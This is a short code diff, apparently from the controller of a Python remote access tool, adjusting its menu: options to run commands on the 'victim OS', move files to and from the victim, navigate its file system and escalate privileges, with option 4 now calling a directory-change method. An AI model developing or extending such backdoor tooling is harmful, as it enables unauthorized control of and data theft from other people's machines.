@@ -8,7 +8,7 @@ def show_options():
     print("\t\t[ 01 ] Run Command on victim OS")
     print("\t\t[ 02 ] Upload File to victim ")
     print("\t\t[ 03 ] Download File from victim")
-    print("\t\t[ 04 ] Download Folder to victim")
+    print("\t\t[ 04 ] Navigate File system")
     print("\t\t[ 05 ] Escalate privilages")
     print("\t\t[ 06 ] Run Command [ADVANCED]")
 
@@ -34,13 +34,13 @@ def handleConnection(my_socket):
 
         elif user_option == "3":
 
-            print("\t\t[+] Download Files from Remote PC")
+            print("\t\t[+] Download Files/Folders")
             download_file_from_victim(my_socket)
 
         elif user_option == "4":
 
-            print("\t\t[+] Download Folders from Remote PC")
-
+            print("\t\t[+] Change Directory / Navigate File system")
+            my_socket.change_dir()
         elif user_option == "5":
 
             print("\t\t[+] Escalate privilages")
